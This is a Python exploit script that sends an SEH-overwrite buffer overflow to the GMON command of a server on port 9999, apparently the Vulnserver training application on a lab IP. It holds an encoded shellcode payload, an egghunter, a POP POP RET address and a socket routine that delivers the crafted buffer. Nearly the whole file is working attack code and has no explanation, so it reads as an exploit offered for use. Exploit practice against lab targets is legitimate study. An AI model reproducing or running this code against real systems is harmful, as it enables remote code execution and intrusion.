#!/usr/bin/env python 

import socket 
import struct 
import sys 

IP = "172.27.254.135"
port = 9999 

command = "GMON /" 

shellcode =  ""
shellcode += "\xdb\xda\xbd\xfb\x55\xa2\x0b\xd9\x74\x24\xf4\x58\x33"
shellcode += "\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13\x03\x93\x46\x40"
shellcode += "\xfe\x9f\x81\x06\x01\x5f\x52\x67\x8b\xba\x63\xa7\xef"
shellcode += "\xcf\xd4\x17\x7b\x9d\xd8\xdc\x29\x35\x6a\x90\xe5\x3a"
shellcode += "\xdb\x1f\xd0\x75\xdc\x0c\x20\x14\x5e\x4f\x75\xf6\x5f"
shellcode += "\x80\x88\xf7\x98\xfd\x61\xa5\x71\x89\xd4\x59\xf5\xc7"
shellcode += "\xe4\xd2\x45\xc9\x6c\x07\x1d\xe8\x5d\x96\x15\xb3\x7d"
shellcode += "\x19\xf9\xcf\x37\x01\x1e\xf5\x8e\xba\xd4\x81\x10\x6a"
shellcode += "\x25\x69\xbe\x53\x89\x98\xbe\x94\x2e\x43\xb5\xec\x4c"
shellcode += "\xfe\xce\x2b\x2e\x24\x5a\xaf\x88\xaf\xfc\x0b\x28\x63"
shellcode += "\x9a\xd8\x26\xc8\xe8\x86\x2a\xcf\x3d\xbd\x57\x44\xc0"
shellcode += "\x11\xde\x1e\xe7\xb5\xba\xc5\x86\xec\x66\xab\xb7\xee"
shellcode += "\xc8\x14\x12\x65\xe4\x41\x2f\x24\x61\xa5\x02\xd6\x71"
shellcode += "\xa1\x15\xa5\x43\x6e\x8e\x21\xe8\xe7\x08\xb6\x0f\xd2"
shellcode += "\xed\x28\xee\xdd\x0d\x61\x35\x89\x5d\x19\x9c\xb2\x35"
shellcode += "\xd9\x21\x67\x99\x89\x8d\xd8\x5a\x79\x6e\x89\x32\x93"
shellcode += "\x61\xf6\x23\x9c\xab\x9f\xce\x67\x3c\x0c\x15\x99\x3c"
shellcode += "\x24\x28\x65\x2c\xe9\xa5\x83\x24\x01\xe0\x1c\xd1\xb8"
shellcode += "\xa9\xd6\x40\x44\x64\x93\x43\xce\x8b\x64\x0d\x27\xe1"
shellcode += "\x76\xfa\xc7\xbc\x24\xad\xd8\x6a\x40\x31\x4a\xf1\x90"
shellcode += "\x3c\x77\xae\xc7\x69\x49\xa7\x8d\x87\xf0\x11\xb3\x55"
shellcode += "\x64\x59\x77\x82\x55\x64\x76\x47\xe1\x42\x68\x91\xea"
shellcode += "\xce\xdc\x4d\xbd\x98\x8a\x2b\x17\x6b\x64\xe2\xc4\x25"
shellcode += "\xe0\x73\x27\xf6\x76\x7c\x62\x80\x96\xcd\xdb\xd5\xa9"
shellcode += "\xe2\x8b\xd1\xd2\x1e\x2c\x1d\x09\x9b\x5c\x54\x13\x8a"
shellcode += "\xf4\x31\xc6\x8e\x98\xc1\x3d\xcc\xa4\x41\xb7\xad\x52"
shellcode += "\x59\xb2\xa8\x1f\xdd\x2f\xc1\x30\x88\x4f\x76\x30\x99"

'''
SEH 6D45376D
	Pattern m7Em (0x6D45376D) found in cyclic pattern at position 3502
nSEH 45366D45
	Pattern Em6E (0x45366D45) found in cyclic pattern at position 3498
POP POP RETN @ 625010B4
'''

nSEH = "\xEB\x80\x90\x90" 
SEH = struct.pack("<L", 0x625010B4) 
nops = "\x90" * 10
egg = "T00WT00W"
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7") 
shellcode = shellcode 
data = egg + nops + shellcode + "A" * (3498 - 128 - len(nops) - len (egg) - len(shellcode)) + nops + egghunter 
data += "B" * (128-(len(nops) + len(egghunter)))  
data += nSEH + SEH + nops 
data += "D" * (4000-((3498 - 128) + len(nops) + len(egghunter) + (128 - len(nops)) + len(nSEH) + len(SEH)))

packet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try: 
	packet.connect((IP, port))
except: 
	print ("\nServer is not running... \n")
	sys.exit(0)

print ("\nConnecting to server...\n")
packet.recv(1024) 
print ("Sending evil data...\n")
packet.send(command + data)
packet.recv(1024)
print ("Closing connection...\n")
packet.close
print ("All done!\n")
